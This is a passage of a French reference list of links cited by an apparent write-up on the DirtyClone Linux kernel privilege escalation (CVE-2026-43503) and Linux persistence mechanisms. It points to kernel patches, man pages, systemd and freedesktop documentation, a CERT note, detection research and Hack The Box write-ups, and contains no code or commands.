- [8] [Dépôt DirtyClone / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog : analyse et exploitation de la variante LPE Linux DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Correctif Linux : net: skb: préserver `SKBFL_SHARED_FRAG` dans `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Ancienne mesure d’atténuation Linux : définir `SKBFL_SHARED_FRAG` pour les paquets UDP spliceés (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — page de manuel Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Hooks Git](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — page de manuel Linux](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — page de manuel Debian](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — documentation du noyau Linux](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [Associations des applications MIME](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Spécification Shared MIME-info](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Spécification Desktop Entry](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Langage Kconfig](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Makefile crypto de Linux](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001 : vulnérabilité du cache de pages AF_ALG du noyau Linux](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — page de manuel Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB : Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Documentation Git de `hash-object`](https://git-scm.com/docs/git-hash-object)
- [32] [Documentation Git de `ls-tree`](https://git-scm.com/docs/git-ls-tree)
- [33] [Documentation de configuration Git](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — page de manuel Linux](https://man7.org/linux/man-pages/man2/openat2.2.html)
- [35] [Documentation des générateurs systemd](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
- [36] [Elastic Security Labs — ingénierie de détection Linux : mécanismes de persistance](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
- [37] [0xdf — HTB : MakeSense](https://0xdf.gitlab.io/2026/10/31/htb-makesense.html)
